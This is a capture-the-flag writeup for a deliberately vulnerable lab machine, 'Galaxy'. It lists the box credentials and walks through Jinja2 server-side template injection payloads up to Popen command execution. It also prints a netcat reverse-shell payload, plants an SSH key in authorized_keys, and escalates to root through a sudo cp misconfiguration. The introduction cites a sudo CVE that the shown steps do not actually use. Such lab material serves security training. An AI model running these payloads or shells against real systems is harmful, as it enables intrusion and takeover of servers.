# [Galaxy]

## Introduction

This machine inspired from this bug bounty report: https://hackerone.com/reports/125980<br>
Galaxy is medium level machine with SSTI vulnerability and CVE-2019-14287 for root part. I suggest medium because getting shell is not straight forward it requires enumeration to get rce via SSTI, however players can do that by googling about SSTI. Player will learn about Popen subclassess and running multiple commands.
## Info for HTB

### Access

Passwords:

| User  | Password                            |
| ----- | ----------------------------------- |
| web | Ab401c |
| root  | root8618 |

### Key Processes

1) SSH server on 22 port
2) Apache2 server on 80 port which is restricted page vulnerable to SSTI
3) Register page username vulnerable to SSTI which happened in real world. This box inspired from https://hackerone.com/reports/125980
4) For root privilege I allowed /usr/bin/cp which players need critical thinking
5) There is other user besides `web` and `root` (john,mathew,lily) and this is dummy user which has no password. I set them for box story and player needs to critical thinking to get shell after finding out CVE-2019-14287

### Automation / Crons
There is no automation

### Firewall Rules

There is no firewall rule

### Docker

There is no docker

### Other

1)I made my own ip address to redirect to galaxy.htb in /etc/apache2/sites-avialabel/000-default.conf<br>


# Writeup

# Enumeration

We begin enumeration with nmap tools from ports of target:<br>
`sudo nmap -sC -sV 192.168.2.110 -p- --min-rate=1000 -T4`<br>
`-sC` This flag for basic scripting<br>
`-sV` This flag for to check version<br>
`-p-` To check all ports we do not want to miss any<br>
`-T4` This flag to make scaning slightly faster (default -T3 when you don't specify)<br>
`--min-rate=1000` This is minimum rate of nmap packets<br>

![image](https://github.com/user-attachments/assets/0ceb7925-bc85-46b2-a07c-a15b77d72ce6)

We can see there are 22 and 80 port open. Website has galaxy.htb domain we need to add that domain with it's IP to our /etc/hosts file :<br>
```
echo "192.168.2.110       galaxy.htb" | sudo tee -a /etc/hosts
```
Website looks like blog about cosmos and it is in beta version
<br>
<br>
![image](https://github.com/user-attachments/assets/139af962-e96d-4f4b-bb40-642cbb41b017)

Enumerating subdomains and directories leads to nothing, let's register for discount! from /register directory
![image](https://github.com/user-attachments/assets/098e8733-963f-49a8-8a8f-4c62672cc313)

After registering we got the message and our username displayed in screen, since we do not have other attack vector let's try to find vulnerability from register page
<br>
After a long research we can find there is SSTI vulnerabilties!<br>
To exploit register with username: `user{{7+7}}`
![image](https://github.com/user-attachments/assets/2f0e3b44-2e52-4330-9346-6977ab12cbfd)


We need to know what template used, for that we use this formula:
![image](https://github.com/user-attachments/assets/14e9e059-81f0-45e6-b9bc-596ef8774d92)
<br>
Payload: `{{7*'7'}}`<br>
![image](https://github.com/user-attachments/assets/516558a4-bc09-473b-8984-ad5c9be9525d)


# Foothold

## Enumeration

We can confirm this is SSTI jinja2 vulnerability. After searching from [blogs](https://www.onsecurity.io/blog/server-side-template-injection-with-jinja2/) and [PayloadAllThethings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md?ref=sec.stealthcopter.com) we need to find `Popen` class for rce<br>

1) First we need to find all classes<br>
Payload: `{{''.__class__.mro()[1].__subclasses__()}}`
![image](https://github.com/user-attachments/assets/a05c7c6e-0ba6-477f-80b3-156d00e34df4)
<br>
We have hundreds of classes including `Popen` which we will use for command execution

2) We need to find it's number for that we copy all of them paste it to `vi` then hit `ESC` and type: `:%s />/\r/g` and finally use `set number` command to sort them with numbers
![image](https://github.com/user-attachments/assets/bab7a081-9157-44d8-8411-e5240b4b7da1)

After using `set number` command inside `vi` we will search `Popen`:<br>
![Screenshot From 2025-03-01 14-04-30](https://github.com/user-attachments/assets/57e1a190-003f-42d1-a14d-b9f812f0e159)

We can see it is in number 522, let's confirm it<br>
<br>
To confirm we use this payload: `{{''.__class__.mro()[1].__subclasses__()[522]}}`
<br>
![image](https://github.com/user-attachments/assets/3ed0b098-5c14-44e9-b34b-69a269a5729b)


Next thing we need to use that process to gain command execution.
Payload: `{{''.__class__.mro()[1].__subclasses__()[522]('id',shell=True,stdout=-1).communicate()}}`
![image](https://github.com/user-attachments/assets/240c1cf0-f115-48d6-a940-1d3ba18c4a94)

We got a response!

Lastly to get shell we will use this payload:
````
{{''.__class__.mro()[1].__subclasses__()[522](['nc IP YOUR_PORT -e /bin/bash'],stdout=-1).communicate()}}
````
Don't forget to set netcat listener!<br>
![image](https://github.com/user-attachments/assets/bacd717c-624b-4d98-a2b5-dde2f0913929)

We got shell. Let's use ssh to get better shell<br>
We copy our public key to /home/web/.ssh/authorized_keys:
```
echo "your id_rsa.pub key" > /home/web/.ssh/authorized_keys
```
If you don't have generate using: `ssh-keygen -t rsa`<br>
After that we can login using our own private key located in /home/your_username/.ssh:
````
ssh -i id_rsa web@galaxy.htb
````
![image](https://github.com/user-attachments/assets/78d55493-9b75-416b-a3e8-91a59efb9a07)


# Privilege Escalation
There is README.txt file let's read it!
````
Dear developers!

We have ongoing "star map" project! We need to finish it as far as possible. 
User john has codes in his home directory start from these codes, but I can not disclose password of any user.
However all developers allowed to copy and paste project codes from devs directory of all user
Please do not store sensitive information in all /home/*/devs directory

Available codes:
/home/john/devs/star-map.js
/home/john/devs/star.html
/home/john/devs/stars.js
````
According to message we can copy everything from all /home/*/devs directory, we can confirm it by sudo rules:
![image](https://github.com/user-attachments/assets/12bd5b31-be6d-478a-ba27-91799c943cf2)
<br>
To get root user, we can copy pubic key of `web` user to the   `/root/.ssh/authorized_keys` locaton as a result we can use ssh without password<br>
Let's first copy our public key to the `devs` directory:
````
cp /home/web/.ssh/id_rsa.pub /home/web/devs/key
````
Then we will copy that public key from  `devs` directory to the `/root/.ssh/authorized_key` using root:
````
$ sudo /usr/bin/cp /home/web/devs/key /root/.ssh/authorized_keys 
$ ssh -i /home/web/.ssh/id_rsa root@192.168.0.107
Welcome to Ubuntu 24.04.2 LTS (GNU/Linux 6.8.0-53-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Fri Feb 21 10:47:28 AM UTC 2025

  System load:  0.0               Processes:               109
  Usage of /:   44.8% of 7.79GB   Users logged in:         1
  Memory usage: 10%               IPv4 address for enp0s3: 192.168.0.110
  Swap usage:   0%

 * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
   just raised the bar for easy, resilient and secure K8s cluster deployment.

   https://ubuntu.com/engage/secure-kubernetes-at-the-edge

Expanded Security Maintenance for Applications is not enabled.

16 updates can be applied immediately.
16 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


Last login: Fri Feb 21 10:30:09 2025 from 192.168.0.110
root@galaxy:~#
````

